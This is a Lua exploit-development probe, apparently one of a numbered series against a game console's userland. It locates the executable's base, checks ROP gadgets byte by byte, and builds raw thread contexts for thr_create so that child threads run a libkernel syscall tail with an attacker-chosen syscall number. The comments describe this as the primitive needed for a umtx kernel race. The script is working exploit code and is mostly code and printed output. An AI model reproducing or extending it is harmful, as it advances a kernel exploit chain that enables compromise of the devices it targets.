-- CRASH_CLASS: HIGH (a child thread executes a stack-built ROP chain)
-- PROBE 158b: does the wrapper tail honour the thread's RAX for a syscall
--             whose effect lands in memory?
--
-- 157a proved a thr_create(430) child can run libkernel's syscall wrapper in a
-- loop, but that wrapper has `mov rax, 116` in front of it, so the thread can
-- only ever call gettimeofday. The interesting syscalls (454 umtx, 560 kevent,
-- 97 socket) need their own number in RAX.
--
-- eboot has no `syscall` instruction (157a scanned 1 MB for 0F 05 C3), but
-- libkernel does, inside the same wrapper: `mov rax, 116; mov r10, rcx;
-- syscall; ret`. The `syscall; ret` tail can be entered directly.
--
-- libkernel .text cannot be read to find that tail, so the wrapper is entered
-- at syscall.syscall_address (past the `mov rax, 116`) with RAX supplied by the
-- thread context:
--
--   RIP = syscall_address   (mov r10, rcx; syscall; ret)
--   RAX = 20 (getpid), RDI = marker page, RSP -> [mov [rdi], rax; ret][jmp $]
--
-- A non-zero marker equal to the process pid proves three things at once: the
-- child executes, an arbitrary syscall number reaches the kernel, and the
-- return value comes back to us.
--
-- This is the step that turns 157a's curiosity into the tool the umtx race
-- needs: swap 20 for 454 and the marker page for a umtx word, and the thread is
-- inside a blocking syscall while the main thread acts.

print("=== PROBE 158b: SYSCALL ARGUMENTS FROM A THREAD CONTEXT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_thr_self = make_syscall(432)
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local C_MAGIC, C_FLAGS, C_TYPE = 0x108, 0x0D0, 0x110
local C_CS, C_RIP, C_RSP, C_SS = 0x0C0, 0x0E0, 0x0F8, 0x100
local C_RDI, C_RAX = 0x048, 0x078

---------------------------------------------------------------------------
-- [0] identity, eboot base, and the libkernel wrapper
---------------------------------------------------------------------------
local ok0, pid0 = pcall(function() return sc_getpid():tonumber() end)
print("[0] canary pid=" .. tostring(pid0))

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)
pcall(function() sc_thr_self(uint64(tid_buf)) end)
local main_tid = rq(tid_buf)
print("[0] main TID=" .. q(main_tid))

local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
if not text_lo then
    print("[0] module query returned nothing; aborting")
    return
end
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot text base=" .. q(eboot_base))

local SW = syscall.syscall_address
if SW == nil then
    print("[0] syscall.syscall_address is nil; the loader did not expose the wrapper")
    return
end
local sw_hi, sw_lo = get_hi_lo(SW)
local wrapper = uint64(string.format("0x%X%08X", sw_hi, sw_lo - 7))
print("[0] syscall_address=" .. q(SW) .. " wrapper=" .. q(wrapper))

-- libkernel .text is execute-only: reading even one byte of it kills the
-- process (this probe's first run died at the line below before it could print
-- a byte). So the wrapper is used, not inspected: syscall.syscall_address
-- already points past the `mov rax, 116`, at `mov r10, rcx; syscall; ret`, and
-- RAX comes from the thread context instead of from the wrapper.
local SysretKnown = false

---------------------------------------------------------------------------
-- [1] the two eboot gadgets, verified by byte before use
---------------------------------------------------------------------------
-- Known from 156d on this firmware; verified before use so a different build
-- cannot silently mis-execute.
local store = eboot_base + 0x92C67
local jmp_self = eboot_base + 0x15481
local function check4(a, b0, b1, b2, b3)
    return rb(a) == b0 and rb(a + 1) == b1 and rb(a + 2) == b2 and rb(a + 3) == b3
end
if not check4(store, 0x48, 0x89, 0x07, 0xC3) then
    print("[1] store gadget mismatch at " .. q(store) .. "; aborting")
    return
end
if not (rb(jmp_self) == 0xEB and rb(jmp_self + 1) == 0xFE) then
    print("[1] jmp $ mismatch at " .. q(jmp_self) .. "; aborting")
    return
end
print("[1] store=" .. q(store) .. " jmp $=" .. q(jmp_self))

---------------------------------------------------------------------------
-- [2] 158a left two facts: context RAX/RDI reach the child (a store gadget
-- wrote 0x1234 from RAX), but the wrapper tail returned 0 for RAX = 20 where
-- the same number returns the pid on the main thread. Both are worth isolating,
-- so this probe uses syscalls whose effect lands in memory instead of in RAX:
--
--   C: RAX = 116 (gettimeofday), RDI = a zeroed timeval -> the struct fills
--   D: RAX = 432 (thr_self),     RDI = an 8-byte buffer  -> the TID lands there
--
-- If C fills, the tail executes the syscall the thread asks for and the umtx
-- race can proceed with RAX = 454.
---------------------------------------------------------------------------
local sentinel = 0xAAAA

local function new_page(n)
    local p = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    for off = 0, (n or 0x38), 8 do
        wq(p + off, uint64(0))
    end
    return p
end

local function new_stack(words)
    local st = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    for k = 0, #words - 1 do
        wq(st + k * 8, words[k + 1])
    end
    return st
end

local function spawn(rip, rax, rdi, rsp)
    local ctx = sc_mmap(uint64(0), uint64(0x1000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    zero(ctx, 0x500)
    wq(ctx + C_MAGIC, uint64(0x480))
    wd(ctx + C_FLAGS, 0)
    wd(ctx + C_TYPE, 0x10000)
    wd(ctx + C_CS, 0x43)
    wq(ctx + C_RIP, rip)
    wq(ctx + C_RSP, rsp)
    wd(ctx + C_SS, 0x3B)
    wq(ctx + C_RAX, rax)
    wq(ctx + C_RDI, rdi)
    local id_buf = memory.alloc(8)
    zero(id_buf, 8)
    local ok, rv = pcall(function() return sc_thr_create(uint64(ctx), uint64(id_buf)) end)
    return rq(id_buf), ok, rv
end

local tv = new_page(0x18)
local tid_out = new_page(0x18)
wq(tid_out, uint64(sentinel))
print("[2] timeval=" .. q(tv) .. " tid_out=" .. q(tid_out))

local tid_c, ok_c, rv_c = spawn(wrapper, uint64(116), tv, new_stack({ jmp_self }))
print("[2] C thr_create: ok=" .. tostring(ok_c) .. " rv=" .. tostring(to_num(rv_c)) .. " tid=" .. q(tid_c))

local tid_d, ok_d, rv_d = spawn(wrapper, uint64(432), tid_out, new_stack({ jmp_self }))
print("[2] D thr_create: ok=" .. tostring(ok_d) .. " rv=" .. tostring(to_num(rv_d)) .. " tid=" .. q(tid_d))

local ts = memory.alloc(16)
wq(ts, 0)
wq(ts + 8, 100000000)
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

local sec = rq(tv)
local usec = rq(tv + 8)
local tid_seen = rq(tid_out)
print("[2] C timeval: sec=" .. q(sec) .. " usec=" .. q(usec))
print("[2] D tid_out=" .. q(tid_seen) .. " (sentinel if untouched)")

pcall(function() sc_thr_kill(tid_c, uint64(0)) end)
pcall(function() sc_thr_kill(tid_d, uint64(0)) end)

local ok3, pid1 = pcall(function() return sc_getpid():tonumber() end)
print("[2] canary after: ok=" .. tostring(ok3) .. " pid=" .. tostring(pid1))

local sv = to_num(sec)
if sv and sv > 1000000000 then
    print("[2] *** THREAD DROVE gettimeofday THROUGH THE TAIL: sec=" .. tostring(sv) .. " ***")
else
    print("[2] C did not fill the timeval (sec=" .. tostring(sv) .. ")")
end
if to_num(tid_seen) ~= sentinel and to_num(tid_seen) ~= 0 then
    print("[2] *** thr_self FROM THE THREAD RETURNED A TID IN MEMORY ***")
else
    print("[2] D left " .. string.format("0x%X", to_num(tid_seen)) .. " in the buffer")
end

print("")
print("=== PROBE 158b DONE ===")
